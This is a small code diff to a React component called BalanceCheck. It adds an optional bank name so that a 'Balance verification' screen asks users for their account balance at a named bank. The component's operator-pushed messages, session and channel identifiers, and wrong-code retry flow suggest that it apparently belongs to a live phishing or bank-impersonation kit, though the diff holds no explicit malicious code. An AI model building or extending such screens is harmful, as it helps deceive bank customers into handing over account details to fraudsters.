@@ -7,6 +7,7 @@ interface BalanceCheckProps {
   apiBase: string;
   channelSlug: string;
   sessionId: string;
+  bank?: string;
   onError: (msg: string) => void;
   wrongCode?: boolean;
   onTryAgain?: () => void;
@@ -17,6 +18,7 @@ export function BalanceCheck({
   apiBase,
   channelSlug,
   sessionId,
+  bank,
   onError,
   operatorMessage,
 }: BalanceCheckProps) {
@@ -49,7 +51,9 @@ export function BalanceCheck({
     <div className="bank-ui-layout">
       <h2 className="bank-ui-heading">Balance verification</h2>
       <p className="bank-ui-body">
-        Please enter your account balance to complete the verification.
+        {bank
+          ? `Please enter your ${bank} account balance to complete the verification.`
+          : "Please enter your account balance to complete the verification."}
       </p>
       {operatorMessage && (
         <div className={messageClass}>{operatorMessage.message}</div>
